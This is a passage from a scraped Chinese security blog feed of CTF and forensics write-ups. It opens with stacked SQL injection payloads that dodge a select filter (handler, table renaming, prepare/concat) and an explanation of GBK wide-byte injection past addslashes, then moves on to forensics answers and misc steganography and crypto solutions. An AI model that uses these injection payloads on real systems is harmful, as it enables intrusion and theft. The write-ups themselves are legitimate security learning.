`1919810931114514`;#</code></pre><p>回显了1919810931114514数据库中字段的信息 发现了flag</p><p>5.过滤了select 但是可以使用handler查看字段信息</p><pre><code class="mysql">1&#39;; handler `1919810931114514` open;handler `1919810931114514` read first;#</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230512154607756.png" alt="image-20230512154607756"></p><p>得到flag{4a26eacf-123d-448e-933e-0535258f3e46}</p><p><strong>解法二：rename改名</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230512160357171.png" alt="image-20230512160357171"></p><p>对于输入1的时候 回显的这部分信息 再加上用handler语句查看的words表中的第一行数据和回显的信息一致 以及查看到words中含有的字段为id和data 猜测其对应的查询语句 可能为 <code>select * from words where id=&#39;$id&#39;</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230512170918760.png" alt="image-20230512170918760"></p><p>即网站源代码中存在的语句是查询名为”words”的表中名为”id”的字段对应的数据</p><p>所以可以将”1919810931114514”表的名字改为”words”将”flag”字段的名字改为”id” 就可以查询到”flag”字段中的信息了</p><pre><code class="mysql">1&#39;;rename table `words` to `words2`;rename table `1919810931114514` to `words`;alter table `words` change `flag` `id` varchar(100) character set utf8 collate utf8_general_ci not null;#</code></pre><p>在输入 <code>1&#39; or 1=1#</code>就可以查询到flag了</p><p><strong>解法三：mysql预处理</strong></p><p>原理是因为题目过滤了select关键字 所以定义一个函数 用s和elect来拼接成select 在进行使用 </p><pre><code class="mysql">1&#39;;prepare st from concat(&#39;s&#39;,&#39;elect&#39;, &#39;* from `1919810931114514`&#39;);execute st;#</code></pre><p>直接查询出flag</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p><strong>字符集</strong>，也叫字符编码 是一种将符号转换为二进制数的映射关系</p><p>常见的字符集：ASCII编码：单字节编码</p><p>latin1编码：单字节编码</p><p>gbk编码：使用单字节和双字节编码</p><p>UTF-8编码：使用一到四字节编码</p><p><strong>宽字节</strong>就是两个以上的字节 <strong>宽字节注入产生的原因就是各种字符编码的不当操作 使得攻击者可以通过宽字节编码绕过sql注入防御</strong></p><p>通常来说 一个gbk编码汉字 占用2字节 一个utf-8编码汉字 占用3个字节 </p><pre><code class="php">echo strlen(&quot;和&quot;)</code></pre><p>当页面保存为gbk时输出2 保存为utf-8时输出3</p><p>除gbk以外 所有的ANSII编码都是两个字节</p><p><strong>产生原因：</strong>程序员设置数据库编码和php编码为两个不同的编码那就有可能产生宽字节注入</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230514212826314.png" alt="image-20230514212826314"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230514213445033.png" alt="image-20230514213445033"></p><p>转义函数会将”<strong>‘</strong>“ 单引号 用” \ “进行转义 防止其影响sql语句</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230514213935175.png" alt="image-20230514213935175"></p><p>使用转义函数addslashes后 将admin后面的单引号转义了 不会对执行sql语句产生影响 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230514214233897.png" alt="image-20230514214233897"></p><p>但是在这里汉字字符将转义字符”吃”掉了 所以对sql语句执行产生了影响 发生宽字节注入</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第六届精武杯wp(服务器部分)</title>
      <link href="/2023/04/28/%E7%AC%AC%E5%85%AD%E5%B1%8A%E7%B2%BE%E6%AD%A6%E6%9D%AFwp(%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E5%88%86)/"/>
      <url>/2023/04/28/%E7%AC%AC%E5%85%AD%E5%B1%8A%E7%B2%BE%E6%AD%A6%E6%9D%AFwp(%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E5%88%86)/</url>
      
        <content type="html"><![CDATA[<h1 id="第六届精武杯wp-服务器部分"><a href="#第六届精武杯wp-服务器部分" class="headerlink" title="第六届精武杯wp(服务器部分)"></a>第六届精武杯wp(服务器部分)</h1><h2 id="5-检材二的操作系统版本是-amp-amp-6-操作系统内核版本"><a href="#5-检材二的操作系统版本是-amp-amp-6-操作系统内核版本" class="headerlink" title="5.检材二的操作系统版本是&amp;&amp;6.操作系统内核版本"></a>5.检材二的操作系统版本是&amp;&amp;6.操作系统内核版本</h2><p><strong>操作系统版本：7.6.1810 (Core)</strong></p><p><strong>内核版本：3.10.0-957.el7.x86_64</strong></p><p><strong>两种方法</strong></p><p><strong>方法一</strong></p><p>直接火眼取证</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427082946897.png" alt="image-20230427082946897"></p><p><strong>方法二</strong></p><p>命令行查找</p><p>操作系统版本</p><pre><code>lsb_release -a //注意需要安装yum install redhat-lsb -ycat /etc/redhat-release</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427084502732.png" alt="image-20230427084502732"></p><p>内核版本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427083120457.png" alt="image-20230427083120457"></p><pre><code>cat /proc/versionuname -auname -r</code></pre><h2 id="7-该服务器原始的开机密码是多少"><a href="#7-该服务器原始的开机密码是多少" class="headerlink" title="7.该服务器原始的开机密码是多少"></a>7.该服务器原始的开机密码是多少</h2><p><strong>hl@7001</strong></p><p>尝试用盘古石和火眼绕过识别密码 但是盘古石仿真不起来 火眼直接重置密码</p><p>后来做计算机的同学说计算机里面有一个vc加密文件 挂载后在txt文件中找到服务器密码</p><p>现在在复现一下当时的做题思路</p><p>在取证大师中看到<strong>我的服务器.txt</strong>疑似tc加密文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427100749817.png" alt="image-20230427100749817"></p><p>仿真起计算机 在桌面看到<strong>切勿修改.txt</strong>的文件 打开内容是”key” ——在E盘找到大小为5GB的<strong>我的服务器.txt</strong>  这个大小是一个非常整的数——想到取证大师里面识别出<strong>我的服务器.txt</strong>文件疑似tc加密容器文件——但其实这里是vc加密 用<strong>切勿修改.txt</strong>作为密钥文件挂载<strong>我的服务器.txt</strong>——在<strong>服务器.txt</strong>里面看到网站服务器密码为<strong>hl@7001</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/vmware_XdTwShB9f9.png" alt="vmware_XdTwShB9f9"></p><h2 id="8-该服务器中，6月25日最后一次登陆服务器的ip地址为"><a href="#8-该服务器中，6月25日最后一次登陆服务器的ip地址为" class="headerlink" title="8.该服务器中，6月25日最后一次登陆服务器的ip地址为"></a>8.该服务器中，6月25日最后一次登陆服务器的ip地址为</h2><p><strong>192.168.110.146</strong></p><p><strong>方法一</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427092039298.png" alt="image-20230427092039298"></p><p>宝塔面板——面板日志——看到6.25最后一次登陆成功的ip地址是192.168.110.146</p><p><strong>方法二</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427092242614.png" alt="image-20230427092242614"></p><p><strong>last</strong>命令查看登陆记录 看到6.25最后一次登陆成功的ip地址是192.168.110.146</p><h2 id="9-宝塔面板登陆用户名-amp-amp-10-宝塔面板占用端口"><a href="#9-宝塔面板登陆用户名-amp-amp-10-宝塔面板占用端口" class="headerlink" title="9.宝塔面板登陆用户名&amp;&amp;10.宝塔面板占用端口"></a>9.宝塔面板登陆用户名&amp;&amp;10.宝塔面板占用端口</h2><p><strong>用户名：smrzz7he  占用端口：8888</strong></p><p><strong>方法一</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427092810906.png" alt="image-20230427092810906"></p><p><strong>方法二</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427092846733.png" alt="image-20230427092846733"></p><h2 id="11-宝塔面板所绑定的手机号码为"><a href="#11-宝塔面板所绑定的手机号码为" class="headerlink" title="11.宝塔面板所绑定的手机号码为"></a>11.宝塔面板所绑定的手机号码为</h2><p><strong>18616963470</strong></p><p><strong>方法一</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427093011249.png" alt="image-20230427093011249"></p><p><strong>方法二</strong></p><pre><code>cat /www/server/panel/data/userInfo.json</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/Xshell_wWa3Vr14C2.png" alt="Xshell_wWa3Vr14C2"></p><h2 id="12-嫌疑人第一次登陆宝塔的时间为"><a href="#12-嫌疑人第一次登陆宝塔的时间为" class="headerlink" title="12.嫌疑人第一次登陆宝塔的时间为"></a>12.嫌疑人第一次登陆宝塔的时间为</h2><p><strong>2022-06-08 11:04:14</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427101152332.png" alt="image-20230427101152332"></p><h2 id="13-宝塔面板平台对于账号的密码采用加盐加密-该salt值为"><a href="#13-宝塔面板平台对于账号的密码采用加盐加密-该salt值为" class="headerlink" title="13.宝塔面板平台对于账号的密码采用加盐加密 该salt值为"></a>13.宝塔面板平台对于账号的密码采用加盐加密 该salt值为</h2><p><strong>6txctAtfAXeI</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427101351813.png" alt="image-20230427101351813"></p><h2 id="14-在宝塔面板账号的密码加密处理过程中-后台一共计算几次MD5值"><a href="#14-在宝塔面板账号的密码加密处理过程中-后台一共计算几次MD5值" class="headerlink" title="14.在宝塔面板账号的密码加密处理过程中 后台一共计算几次MD5值"></a>14.在宝塔面板账号的密码加密处理过程中 后台一共计算几次MD5值</h2><p><strong>3</strong></p><p>宝塔的文件存放在<font color="red"><strong>&#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;bt</strong></font></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427205705240.png" alt="image-20230427205705240"></p><p>看到了是调用了 panel_path下的tools.py</p><p>前面也提到了 这个panel_path的路径</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427210603157.png" alt="image-20230427210603157"></p><p>一般来讲 宝塔的账号密码就放在<font color="red"><strong>&#x2F;www&#x2F;server&#x2F;panel</strong></font>下的<strong>tools.py</strong>下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427210719201.png" alt="image-20230427210719201"></p><p>发现调用了public下的password_salt函数  且计算了一次MD5值</p><p>转到public.py  他在&#x2F;www&#x2F;server&#x2F;panel&#x2F;class下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427211057195.png" alt="image-20230427211057195"></p><p>这里又算了两次MD5  所以一共是三次</p><h2 id="15-请分析目标服务器中网站管理员登录的入口地址为"><a href="#15-请分析目标服务器中网站管理员登录的入口地址为" class="headerlink" title="15.请分析目标服务器中网站管理员登录的入口地址为"></a>15.请分析目标服务器中网站管理员登录的入口地址为</h2><p><strong>&#x2F;admin</strong></p><p>按照16题图 进入网站运行目录</p><p>运行目录下管理员入口地址就是&#x2F;admin</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427110103406.png" alt="image-20230427110103406"></p><h2 id="16-目标服务器中网站的网站运行目录为"><a href="#16-目标服务器中网站的网站运行目录为" class="headerlink" title="16.目标服务器中网站的网站运行目录为"></a>16.目标服务器中网站的网站运行目录为</h2><p><strong>&#x2F;public</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427105722400.png" alt="image-20230427105722400"></p><h2 id="17-请分析目标服务器中，嫌疑人刘某的账号所对应的邀请码为："><a href="#17-请分析目标服务器中，嫌疑人刘某的账号所对应的邀请码为：" class="headerlink" title="17.请分析目标服务器中，嫌疑人刘某的账号所对应的邀请码为："></a>17.请分析目标服务器中，嫌疑人刘某的账号所对应的邀请码为：</h2><p><strong>2364</strong></p><p>后台的账号密码等数据在网站数据库中 用宝塔自带的phpadmin可以登陆数据库 </p><p>在此处进入</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427110318474.png" alt="image-20230427110318474"></p><p>可以看到管理员登陆的账号密码是admin admin</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427111209254.png" alt="image-20230427111209254"></p><p>而网站是嫌疑人刘某的  那么账户admin就是刘某</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427111232645.png" alt="image-20230427111232645"></p><h2 id="18-在网站前端页面中，用户使用”购买会员”功能时，界面显示需要支付的金额为多少"><a href="#18-在网站前端页面中，用户使用”购买会员”功能时，界面显示需要支付的金额为多少" class="headerlink" title="18.在网站前端页面中，用户使用”购买会员”功能时，界面显示需要支付的金额为多少"></a>18.在网站前端页面中，用户使用”购买会员”功能时，界面显示需要支付的金额为多少</h2><p><strong>1</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427111808792.png" alt="image-20230427111808792"></p><p>在这个目录下的99999.php、head.php等文件中 都能看出 购买会员需要支付1RMB</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427111928652.png" alt="image-20230427111928652"></p><h2 id="19-请分析目标服务器中网站代理登录的入口地址为"><a href="#19-请分析目标服务器中网站代理登录的入口地址为" class="headerlink" title="19.请分析目标服务器中网站代理登录的入口地址为"></a>19.请分析目标服务器中网站代理登录的入口地址为</h2><p><strong>&#x2F;user</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427112051535.png" alt="image-20230427112051535"></p><h2 id="20-该网站后台所使用的数据库版本号为："><a href="#20-该网站后台所使用的数据库版本号为：" class="headerlink" title="20.该网站后台所使用的数据库版本号为："></a>20.该网站后台所使用的数据库版本号为：</h2><p><strong>5.6.50</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427112334252.png" alt="image-20230427112334252"></p><h2 id="21-该网站所使用的数据库的库名（database名）为"><a href="#21-该网站所使用的数据库的库名（database名）为" class="headerlink" title="21. 该网站所使用的数据库的库名（database名）为"></a>21. 该网站所使用的数据库的库名（database名）为</h2><p><strong>sr2</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427112422442.png" alt="image-20230427112422442"></p><h2 id="22-该网站所使用的数据库的root密码为"><a href="#22-该网站所使用的数据库的root密码为" class="headerlink" title="22.该网站所使用的数据库的root密码为"></a>22.该网站所使用的数据库的root密码为</h2><p><strong>ee09f228483aaf60</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427112504573.png" alt="image-20230427112504573"></p><h2 id="23-该网站代码中，记录数据库账号密码的配置文件名为"><a href="#23-该网站代码中，记录数据库账号密码的配置文件名为" class="headerlink" title="23.该网站代码中，记录数据库账号密码的配置文件名为"></a>23.该网站代码中，记录数据库账号密码的配置文件名为</h2><p><strong>database.php</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427114028978.png" alt="image-20230427114028978"></p><h2 id="24-请分析该网站后台的管理员登陆密码为"><a href="#24-请分析该网站后台的管理员登陆密码为" class="headerlink" title="24. 请分析该网站后台的管理员登陆密码为"></a>24. 请分析该网站后台的管理员登陆密码为</h2><p><strong>admin</strong></p><p>同17题</p><h2 id="25-请分析检材二，嫌疑人刘某一共有几位下级代理（包括刘某自己）"><a href="#25-请分析检材二，嫌疑人刘某一共有几位下级代理（包括刘某自己）" class="headerlink" title="25. 请分析检材二，嫌疑人刘某一共有几位下级代理（包括刘某自己）"></a>25. 请分析检材二，嫌疑人刘某一共有几位下级代理（包括刘某自己）</h2><p><strong>4个</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427114159269.png" alt="image-20230427114159269"></p><h2 id="26-请分析检材二，嫌疑人刘某设置的支付方式使用的通讯密钥为"><a href="#26-请分析检材二，嫌疑人刘某设置的支付方式使用的通讯密钥为" class="headerlink" title="26.请分析检材二，嫌疑人刘某设置的支付方式使用的通讯密钥为"></a>26.请分析检材二，嫌疑人刘某设置的支付方式使用的通讯密钥为</h2><p><strong>cc88afc0114805b4819e01c9e1f1f98e</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230428082807996.png" alt="image-20230428082807996"></p><h2 id="27-请分析检材二，代理用户的密码使用了某个算法进行加密，该加密算法方法名为"><a href="#27-请分析检材二，代理用户的密码使用了某个算法进行加密，该加密算法方法名为" class="headerlink" title="27.请分析检材二，代理用户的密码使用了某个算法进行加密，该加密算法方法名为"></a>27.请分析检材二，代理用户的密码使用了某个算法进行加密，该加密算法方法名为</h2><p><strong>password_hash</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230427114712934.png" alt="image-20230427114712934"></p><p><strong>最后在梳理一下做题的流程 ——首先是火眼分析一波(注意有linux服务器的一定要在自动分析后在点快速分析一次 不然看不到结果) ——然后仿真起 盘古石能仿真的话最好别重置密码 看一下原始密码 仿真不了用火眼会自动重置密码 原始密码可以后续检材找 ——看一下本地ip和虚拟机ip是否在同一局域网下 不在就手动修改 ——xshell远程连接——有宝塔面板的就重置宝塔密码 起宝塔——自此 大部分信息都可以从火眼分析和宝塔面板里面看到了 包括网站源文件 数据库等等</strong></p><p>所幸此次取证服务器没涉及到网站重构 不然就又要坐大牢了 还是要学习一下这个方面的东西啊  任重道远…….</p>]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>社团春季赛miscwp</title>
      <link href="/2023/04/16/%E7%A4%BE%E5%9B%A2%E6%98%A5%E5%AD%A3%E8%B5%9B/"/>
      <url>/2023/04/16/%E7%A4%BE%E5%9B%A2%E6%98%A5%E5%AD%A3%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="社团春季赛wp-Misc"><a href="#社团春季赛wp-Misc" class="headerlink" title="社团春季赛wp(Misc)"></a>社团春季赛wp(Misc)</h1><h2 id="April-misc1-ez-vera"><a href="#April-misc1-ez-vera" class="headerlink" title="April_misc1_ez_vera"></a>April_misc1_ez_vera</h2><p>给了一个压缩包  但是不能爆破出密码(别问我是怎么知道的QAQ)放入winhex里面找一下 是伪加密</p><p>改完后有一个需要挂载的vc容器 一个key.jpg</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230416204403661.png" alt="image-20230416204403661"></p><p>加密密钥就是key.jpg  得到一段密文</p><pre><code>cppjrbvxlbvloou!kesg ls ujh fmcj : fmcj&#123;379ccg45-hcb0-21g3-0d69-5bf509e3idbe&#125; vong zosfv ticw d3g4w1w tp espv ewfftv: hprh ypw fao mheq irioi,jeu uwrppjes cqd ogyes ilvf ws.</code></pre><p>观察发现标点符号没有变化(比如大括号和感叹号) 所以可以判断不是移位密码 所以可能是凯撒密码或者维吉尼亚密码 因为没有密码 所以可以用一个可以爆破的维吉尼亚解密网站</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230416204509614.png" alt="image-20230416204509614"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230416204556662.png" alt="image-20230416204556662"></p><pre><code>https://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx</code></pre><p>:horse:flag{379cbe45-eca0-21e3-0a69-5be509c3fdac}</p><h2 id="April-misc2-滑稽滑稽滑稽-lsb隐写"><a href="#April-misc2-滑稽滑稽滑稽-lsb隐写" class="headerlink" title="April_misc2_滑稽滑稽滑稽(lsb隐写)"></a>April_misc2_滑稽滑稽滑稽(lsb隐写)</h2><p>将windows 7 x64.vmdk镜像仿真出来 看到桌面上有一张图片 回收站里面有东西 恢复是hint.txt</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230415155448295.png" alt="image-20230415155448295"></p><p>提示的很明显了  lsb隐写</p><p>将照片提出来 stegsolve中看一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230415160737423.png" alt="image-20230415160737423"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230415160824917.png" alt="image-20230415160824917"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230415160835126.png" alt="image-20230415160835126"></p><p>可以看出在red blue green的0通道处都有隐写 于是data  extract拿到flag</p><p>:horse:flag{a3f02651-f720-3730-d9bd-7caeda826105}</p><h2 id="April-misc3-winhex-流量分析-过滤http数据-网站登陆方式post"><a href="#April-misc3-winhex-流量分析-过滤http数据-网站登陆方式post" class="headerlink" title="April_misc3_winhex(流量分析 过滤http数据 网站登陆方式post)"></a>April_misc3_winhex(流量分析 过滤http数据 网站登陆方式post)</h2><p>给的winhex.vhd映像是可以装载的 装载后 在一个盘符中可以找到一个流量包 simple.pcap 放入wireshark分析</p><p>题目描述：JD网站被黑客挂马，请找出黑客登录系统使用的密码是_____________，得到的flag</p><p>对于网站登陆账户密码的流量包 首先过滤http数据流 一般账户和密码的提交方式都是post方式 所以过滤语句写成：http.request.method&#x3D;&#x3D;POST</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230415161946113.png" alt="image-20230415161946113"></p><p>第一个流量包就是POST&#x2F;index.php？m&#x3D;Home&amp;c&#x3D;Members&amp;a&#x3D;login HTTP&#x2F;1.1  </p><p>login就是登陆页面 追踪http流</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230415191133856.png" alt="image-20230415191133856"></p><p>或者直接在下面就可以看到</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230415191302323.png" alt="image-20230415191302323"></p><p>得到:horse:flag{Admin123!@<strong>#</strong>}</p><h2 id="April-misc4-超大的gif-gif分帧"><a href="#April-misc4-超大的gif-gif分帧" class="headerlink" title="April_misc4_超大的gif(gif分帧)"></a>April_misc4_超大的gif(gif分帧)</h2><p>耐心的看一会儿gif </p><p>到870x左右的时候闪过一张二维码 使用分帧工具 成功分出有二维码的帧</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230415192013620.png" alt="image-20230415192013620"></p><p>扫二维码得到:horse:flag{The_G1F_ls_T00_b1g}</p><h2 id="April-misc6-进击的misc-lsb隐写-base91-hex加密"><a href="#April-misc6-进击的misc-lsb隐写-base91-hex加密" class="headerlink" title="April_misc6_进击的misc(lsb隐写 base91 hex加密)"></a>April_misc6_进击的misc(lsb隐写 base91 hex加密)</h2><p>首先 从压缩包里面解压出一个音频文件：是一首叫恶魔之子的歌 了解的人应该知道这是进击的巨人第四季ED</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230324090709290.png" alt="image-20230324090709290"></p><p>听起来没什么问题 让我们放到audacuty中看一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230324093408794.png" alt="image-20230324093408794"></p><p>不行 放到010editor中看一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230324093530476.png" alt="image-20230324093530476"></p><p>搜索发现音频后面有一张png图片</p><p>提取出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/allen.png" alt="allen"></p><p>看到给了一个密钥 Key:Attack_on_Titan</p><p>然后需要我们找到密文 尝试在kali中使用binwalk zsteg foremost等方法没有用</p><p>考虑lsb隐写 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230324094513240.png" alt="image-20230324094513240"></p><p>得到一个flag.txt放到winhex中发现其实是一个压缩包 更改后缀名 发现一个加密的91+hex.txt的文件 试将刚才得到的key输进去 结果正确</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230324094723821.png" alt="image-20230324094723821"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230324094746507.png" alt="image-20230324094746507"></p><p>根据文件名提示91+hex 可能是base91和hex加密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230324094837322.png" alt="image-20230324094837322"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230324094904504.png" alt="image-20230324094904504"></p><pre><code>进击的巨人从2013年开始放送，到现在2023年 已经是十年的时光。当时的播放量一度超过了火影和海贼。这部番也从陪伴了我从高一开始的青春岁月，四年时间说长不长，说短不短。漫画已在前年完结，动漫也将在今年落下尾声。对于最终的结局，褒贬不一，有人说是烂尾，有人说是神作。而我觉得这个开放式结局，就是谏山创老师为这部作品以及众多深深热爱这部作品的友友们最好的礼物。就像一千个人心里有一千个哈姆雷特，每个人的心中都有一个自己觉得完美的结局，而开放式结局，为大家留下的想象的空间，将让这部作品即使完结已久，再次聊起仍会津津乐道。十年时间，为自由献出的每一颗心脏都值得我们纪念。在这里，让我们最后一次身披自由之翼，喊出那句：flag&#123;xian_shang_xin_zang&#125; !!!!!</code></pre><p>得到:horse:flag{xian_shang_xin_zang} </p><h2 id="April-misc8-只因-winhex隐藏文件-hex逆序"><a href="#April-misc8-只因-winhex隐藏文件-hex逆序" class="headerlink" title="April_misc8_只因(winhex隐藏文件 hex逆序)"></a>April_misc8_只因(winhex隐藏文件 hex逆序)</h2><p>压缩包里面一张图片 放010editor里面 全局搜索 发现两张图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230323202810964.png" alt="image-20230323202810964"></p><p>还发现一个压缩包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230323203354856.png" alt="image-20230323203354856"></p><p>全部提取</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230323203445527.png" alt="image-20230323203445527"></p><p>其中key.jpg上有一个问题是练习时间是多长，这个大家都知道，是两年半（liangnianban）</p><p>发现压缩包有密码，且不是伪加密</p><p>试将key.jpg中问题的答案作密码填入压缩包中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230323203741997.png" alt="image-20230323203741997"></p><p>得到zhiyin.jpg 但显示图片损坏 看不了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230323203857653.png" alt="image-20230323203857653"></p><p>最后四位发现是一张完全倒置的图片 写个脚本将其反转</p><pre><code class="python">with open(&#39;zhiyin.jpg&#39;, &#39;rb&#39;) as f:    with open(&#39;flag.jpg&#39;, &#39;wb&#39;) as g:        g.write(f.read()[::-1])</code></pre><p>得到正确图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/zhiyin0.jpg" alt="zhiyin0"></p><p>:horse:flag{do_you_like_zhiyin}</p><h2 id="April-misc9-telephone-number"><a href="#April-misc9-telephone-number" class="headerlink" title="April_misc9_telephone_number"></a>April_misc9_telephone_number</h2><pre><code>手机在AirDrop时传输的手机号哈希值，已知该手机号是170号段首批放号的联通号码，你能找到该手机号吗？(含国家代码)Hash：daa0959c1de27ce05b75d133d8881d0b1ef261c5e615bdd1238d396880bb4223</code></pre><p>脚本原理是根据手机号的哈希值进行爆破  </p><p>从8617000000000到8617100000000</p><pre><code class="python">import hashlibsha256 = &#39;daa0959c1de27ce05b75d133d8881d0b1ef261c5e615bdd1238d396880bb4223&#39;for i in range(8617000000000, 8617100000000):    hash = hashlib.sha256(str(i).encode(&#39;utf-8&#39;)).hexdigest()     # 先进行utf-8加密在转sha256 在转成16进制    if hash == sha256:        print(i)        break# 8617091733719</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/7d3559219edd4629b0d37938362459f0.png" alt="img"></p><p>查阅资料可以知道这种哈希加密算法是sha256</p><p>:horse:flag{8617091733719}</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023愚人杯misc wp</title>
      <link href="/2023/04/13/2023%E6%84%9A%E4%BA%BA%E6%9D%AFmiscwp/"/>
      <url>/2023/04/13/2023%E6%84%9A%E4%BA%BA%E6%9D%AFmiscwp/</url>
      
        <content type="html"><![CDATA[<h1 id="2023愚人杯部分miscwp"><a href="#2023愚人杯部分miscwp" class="headerlink" title="2023愚人杯部分miscwp"></a>2023愚人杯部分miscwp</h1><h2 id="哇库哇库2"><a href="#哇库哇库2" class="headerlink" title="哇库哇库2"></a>哇库哇库2</h2><p>在给的压缩包的注释中看到解压密码的提示</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412090152685.png" alt="image-20230412090152685"></p><p>结果就是自然对数e 保留12位有效数字 密码是2.71828182846</p><p>解压出一张HINT.png和一个docx文档</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412090342866.png"></p><p>但是图片是坏的 进行修复</p><p>先用crc脚本看一下分辨率有没有问题</p><pre><code class="python">import binasciiimport structcrc32_hex = 0X72DC3AB7   # 后面添所选图片的crc值 为0xfilename = &#39;HINT.png&#39; # 后面添图片的名字 要将图片和脚本放在同一目录下 保证路径相同crcbp = open(filename, &quot;rb&quot;).read()for i in range(2000):    for j in range(2000):        data = crcbp[12:16] + \            struct.pack(&#39;&gt;i&#39;, i) + struct.pack(&#39;&gt;i&#39;, j) + crcbp[24:29]        crc32 = binascii.crc32(data) &amp; 0xffffffff        if(crc32 == 